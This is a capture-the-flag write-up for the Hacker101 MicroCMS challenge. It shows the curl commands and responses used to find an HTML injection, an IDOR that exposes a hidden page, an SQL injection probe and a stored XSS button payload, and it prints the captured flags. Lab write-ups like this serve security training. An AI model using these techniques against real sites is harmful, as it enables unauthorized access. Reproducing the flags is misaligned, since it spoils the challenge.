# Easy - MicroCMS

## Flag 0x01

Here we've got a simple CMS web app, we can edit existing pages with markdown text editor, we can also create new pages with the same markdown editor.

The markdown editor has a hint:
> Markdown is supported, but scripts are not

Local repo:
So I tried to inject JS and HTML random stuff, rendering of injects were parsed as expected:
![HTML Injection](../static/2024-09-17_12-27.png)

Except in the pages list where the titles rendered html successfully (and potentially JS):
![HTML Injection rendered](../static/2024-09-17_13-18.png)

## Flag 0x02
The CMS shows only 2 pages and we are able to edit those, looping through the page id on the url we can see there is one more page hidden from the list:
```bash
n0kt.b0wer:.../ctf-notes/h1 (main) ➜ curl 'https://91c75d076bf3833b783dc5e5541638f1.ctf.hacker101.com/page/edit/7'                                     [14:11:06]
<!doctype html>
<html>
    <head>
        <title>Edit page</title>
    </head>
    <body>
        <a href="../../">&lt;-- Go Home</a>
        <h1>Edit Page</h1>
        <form method="POST">
            Title: <input type="text" name="title" value="Private Page"><br>
            <textarea name="body" rows="10" cols="80">My secret is ^FLAG^*******************5aed9107eb5bf097afc1fadb7f82c85e3263a1$FLAG$</textarea><br>
            <input type="submit" value="Save">
            <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
        </form>
    </body>
</html>
```
## Flag 0x03
Found SQLi:
```bash
n0kt.b0wer:.../ctf-notes/h1 (main) ➜ curl "https://91c75d076bf3833b783dc5e5541638f1.ctf.hacker101.com/page/edit/2'"                                    [14:40:
^FLAG^bd9eb5126a15edbe784623d236eb301b28b959e0d65a105b9cc340a7762448a2$FLAG$%
```
## Flag 0x04
The last one is to edit any markdown page and put an html with xss injected, after saved, check the src:
```bash
n0kt.b0wer:.../ctf-notes/h1 (main) ➜ curl -s 'https://91c75d076bf3833b783dc5e5541638f1.ctf.hacker101.com/page/2' | ag FLAG                             [14:44:33]
<button flag="^FLAG^607b6e4f74f4078ba71a6adc3596cad90022dd897e88d8fbf74d8ce6bf9e4ca2$FLAG$" onclick=alert(‘xss’)>click</button></p>
```